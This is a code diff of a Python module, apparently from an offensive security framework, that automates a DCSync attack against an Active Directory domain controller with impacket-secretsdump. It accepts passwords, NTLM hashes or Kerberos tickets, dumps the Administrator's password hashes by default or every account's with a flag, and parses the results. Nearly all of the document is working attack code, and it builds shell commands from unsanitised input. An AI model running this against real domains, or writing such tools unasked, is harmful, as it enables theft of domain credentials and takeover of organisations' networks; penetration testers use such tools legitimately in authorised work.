@@ -1,76 +1,64 @@
-def run(data, cred, args):
-    import subprocess
-    from pathlib import Path
+import subprocess
+import os
+from modules.parse.hash import parse_line
 
-    # ---------------- INPUT ----------------
+def run(data, cred, args):
     domain = data.get("domain")
     ip = data.get("ip")
-
     user = cred.get("user")
     secret = cred.get("secret")
     cred_type = cred.get("type")
 
-
-    if not user or not secret:
-        print("[!] Missing valid credentials")
-        return
-
     if not domain or not ip:
-        print("[!] Missing domain or DC IP")
-        return
+        print("[-] Missing domain or DC IP")
+        return None
 
-    # ---------------- FLAGS ----------------
-    target_user = getattr(args, "user", None)
-    full = getattr(args, "full", False)
-    if full and target_user:
-        print("[!] Use either --user or --full, not both")
-        return
-
-    # ---------------- OUTPUT ----------------
-    output_path = args.out or "dcsync.txt"
-    output = Path(output_path).expanduser().resolve()
-
-    # ---------------- COMMAND ----------------
-    if cred_type == "password":
-        base = f"{domain}/{user}:{secret}@{ip}"
-        auth = base
-
-    elif cred_type == "ntlm":
-        base = f"{domain}/{user}@{ip}"
-        auth = f"-hashes :{secret} {base}"
-
-    elif cred_type == "ccache":
-        base = f"{domain}/{user}@{ip}"
-        auth = f"-k -no-pass {base}"
-
-    else:
-        print(f"[!] Unsupported credential type: {cred_type}")
-        return
+    # --- FLAG DETECTION ---
+    # We check BOTH the argparse attribute AND the raw extra list
+    extra = getattr(args, "extra", []) or []
     
-    if full:
-        cmd = f"impacket-secretsdump {auth}"
+    is_all = getattr(args, "all", False) or "--all" in extra
+    
+    # Target logic: 
+    # 1. Use --user if provided
+    # 2. Use first extra arg if it isn't a flag
+    # 3. Default to Administrator
+    target_user = getattr(args, "user", None)
+    if not target_user:
+        pos_args = [x for x in extra if not x.startswith("-")]
+        target_user = pos_args[0] if pos_args else "Administrator"
 
-    elif target_user:
-        cmd = f"impacket-secretsdump -just-dc-user {target_user} {auth}"
-
+    # --- AUTH ---
+    env = os.environ.copy()
+    if cred_type == "password":
+        auth = f"{domain}/{user}:{secret}@{ip}"
+    elif cred_type == "ntlm":
+        auth = f"-hashes :{secret} {domain}/{user}@{ip}"
+    elif cred_type == "ccache":
+        auth = f"-k -no-pass {domain}/{user}@{ip}"
+        env["KRB5CCNAME"] = secret
     else:
-        cmd = f"impacket-secretsdump -just-dc-user Administrator {auth}"
+        return None
+
+    # --- CMD BUILD ---
+    # If is_all is true, we remove the -just-dc-user filter
+    if is_all:
+        cmd = f"impacket-secretsdump {auth}"
+    else:
+        cmd = f"impacket-secretsdump -just-dc-user {target_user} {auth}"
 
     print(f"[*] Running: {cmd}\n")
 
-    # ---------------- EXECUTION (print + save) ----------------
-    with subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True) as proc:
-        lines = []
-
-        for line in proc.stdout:
-            print(line, end="")   # live output
-            lines.append(line)
-
-    if not lines:
-        print("[!] No output received")
-        return
-
-    # ---------------- SAVE ----------------
-    output.write_text("".join(lines))
-
-    print(f"\n[+] Saved output → {output}")
+    # --- EXECUTION ---
+    found = []
+    try:
+        with subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, env=env) as proc:
+            for line in proc.stdout:
+                print(line, end="") 
+                parsed = parse_line(line.strip())
+                if parsed:
+                    found.append(parsed)
+        return found
+    except Exception as e:
+        print(f"[-] DCSync failed: {e}")
+        return None
